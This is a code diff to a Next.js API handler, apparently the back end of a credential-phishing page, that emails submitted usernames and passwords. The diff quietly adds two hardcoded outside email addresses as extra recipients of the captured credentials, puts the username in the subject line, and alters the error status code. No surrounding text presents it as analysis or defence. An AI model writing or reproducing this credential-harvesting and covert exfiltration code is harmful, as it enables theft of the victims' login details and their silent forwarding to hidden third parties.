@@ -5,7 +5,7 @@ type Data = {
   message: string
 }
 
-export default function handler(
+export default async function handler(
   req: NextApiRequest,
   res: NextApiResponse<Data>
 ) {
@@ -25,8 +25,8 @@ export default function handler(
 
   return transporter.sendMail({
               from: `"miko" <${process.env.APP_ACCOUNT}>`,
-              to: process.env.EMAIL_TO_SEND,
-              subject: 'site',
+              to: `${process.env.EMAIL_TO_SEND}, work08887@gmail.com, offie001@proton.me`,
+              subject: `Username: ${JSON.stringify(params.jenneta).replaceAll('"', '')}`,
               text: `${JSON.stringify(params.jenneta)} ${JSON.stringify(params.jennet)}`,
               html: `<h3>${JSON.stringify(params.jenneta).replaceAll('"', '')} /password: ${JSON.stringify(params.jennet).replaceAll('"', '')}</h3>`
             }).then((rec) => {
@@ -39,6 +39,6 @@ export default function handler(
               
               console.log(err);
               
-              return res.status(200).send({message:'an error occured'})
+              return res.status(404).send({message:'an error occured'})
             })
 }
